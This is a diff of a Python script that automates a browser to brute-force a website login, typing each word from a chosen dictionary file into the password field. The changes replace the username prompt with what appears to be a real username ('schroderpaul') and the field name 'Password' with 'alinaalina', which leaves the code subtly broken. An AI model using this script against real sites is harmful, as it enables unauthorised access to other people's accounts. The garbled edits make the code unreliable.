@@ -1,7 +1,7 @@
 from webbot import Browser
 from pynput.keyboard import Key, Controller
 import time
-username = input('Username: ')
+username = input('schroderpaul: ')
 dictionary = input('Choose Dictionary: ')
 
 file = open(f'{dictionary}.txt', 'r')
@@ -27,6 +27,6 @@ web.type(username)
 keyboard.press(Key.tab)
 keyboard.release(Key.tab)
 for brute in bruteforce:
-    web.type(brute, into="Password")
+    web.type(brute, into="alinaalina")
     keyboard.press(Key.enter)
     keyboard.release(Key.enter)
